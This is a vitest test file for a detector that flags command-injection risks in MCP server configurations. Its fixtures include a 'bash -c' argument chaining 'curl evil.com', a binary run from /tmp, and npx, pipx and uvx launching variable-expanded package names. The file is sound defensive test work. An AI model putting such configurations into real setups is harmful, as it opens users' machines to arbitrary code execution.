import { describe, expect, it } from 'vitest';
import { detectInjection } from './injection-detector.js';
import type { AuditArtifact } from '../types.js';

const baseArtifact = (name: string, config: object): AuditArtifact => ({
  id: `mcp_server:${name.toLowerCase()}`,
  type: 'mcp_server',
  name,
  path: '~/.claude.json',
  description: '',
  prompt: JSON.stringify(config),
  metadata: { lastModified: new Date(), size: 0 },
});

describe('detectInjection — MCP STDIO command-injection risk', () => {
  it('flags bash -c with concatenated command string as critical', () => {
    const findings = detectInjection([
      baseArtifact('shell-c', { command: 'bash', args: ['-c', 'echo hello && curl evil.com'] }),
    ]);
    const stdio = findings.filter(f => f.category === 'mcp_stdio_command_risk');
    expect(stdio).toHaveLength(2); // shell -c + metacharacters in args
    expect(stdio.some(f => f.severity === 'critical' && f.title.includes('-c'))).toBe(true);
  });

  it('flags shell metacharacters in args', () => {
    const findings = detectInjection([
      baseArtifact('meta', { command: 'node', args: ['server.js', '--out', '>/dev/null'] }),
    ]);
    const stdio = findings.filter(f => f.category === 'mcp_stdio_command_risk');
    expect(stdio).toHaveLength(1);
    expect(stdio[0].severity).toBe('recommended');
    expect(stdio[0].title).toMatch(/metacharacters/);
  });

  it('flags binary in writable location as critical', () => {
    const findings = detectInjection([
      baseArtifact('tmp-bin', { command: '/tmp/some-server', args: [] }),
    ]);
    const stdio = findings.filter(f => f.category === 'mcp_stdio_command_risk');
    expect(stdio).toHaveLength(1);
    expect(stdio[0].severity).toBe('critical');
    expect(stdio[0].title).toMatch(/writable location/);
  });

  it('flags npx with variable-expanded package name as critical', () => {
    const findings = detectInjection([
      baseArtifact('npx-var', { command: 'npx', args: ['-y', '${MCP_PACKAGE_NAME}'] }),
    ]);
    const stdio = findings.filter(f => f.category === 'mcp_stdio_command_risk');
    expect(stdio).toHaveLength(1);
    expect(stdio[0].severity).toBe('critical');
    expect(stdio[0].title).toMatch(/variable-expanded/);
  });

  it('flags pipx and uvx the same way as npx', () => {
    const findings = detectInjection([
      baseArtifact('pipx-var', { command: 'pipx', args: ['run', '${PKG}'] }),
      baseArtifact('uvx-var', { command: 'uvx', args: ['${TOOL}'] }),
    ]);
    expect(findings.filter(f => f.category === 'mcp_stdio_command_risk' && f.title.includes('variable-expanded'))).toHaveLength(2);
  });

  it('does NOT flag a clean direct-binary config', () => {
    const findings = detectInjection([
      baseArtifact('safe', { command: 'node', args: ['/usr/local/bin/server.js'] }),
      baseArtifact('safe-pinned', { command: 'npx', args: ['-y', '@org/pkg@1.2.3'] }),
    ]);
    expect(findings.filter(f => f.category === 'mcp_stdio_command_risk')).toHaveLength(0);
  });

  it('does NOT flag url-based MCP servers', () => {
    const findings = detectInjection([
      baseArtifact('url-mcp', { url: 'http://localhost:7700/mcp' }),
    ]);
    expect(findings.filter(f => f.category === 'mcp_stdio_command_risk')).toHaveLength(0);
  });

  it('handles malformed JSON gracefully', () => {
    const malformed: AuditArtifact = {
      id: 'mcp_server:broken',
      type: 'mcp_server',
      name: 'broken',
      path: '~/.claude.json',
      description: '',
      prompt: '{not valid json',
      metadata: { lastModified: new Date(), size: 0 },
    };
    expect(() => detectInjection([malformed])).not.toThrow();
  });
});
